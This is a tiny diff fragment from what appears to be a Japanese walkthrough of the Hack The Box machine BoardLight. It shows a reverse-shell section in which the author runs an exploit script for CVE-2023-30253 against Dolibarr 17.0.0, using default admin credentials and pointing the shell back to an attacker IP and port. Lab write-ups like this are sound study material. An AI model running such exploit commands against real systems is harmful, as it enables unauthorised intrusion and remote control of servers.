@@ -190,6 +190,7 @@ options:
 ```
 
 ## リバースシェル確立
+
 ```
 ┌──(kali㉿kali)-[~/htb/Retired_Machines/BoardLight/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253]
 └─$ python3 exploit.py http://crm.board.htb admin admin 10.xx.xx.xx 9001 
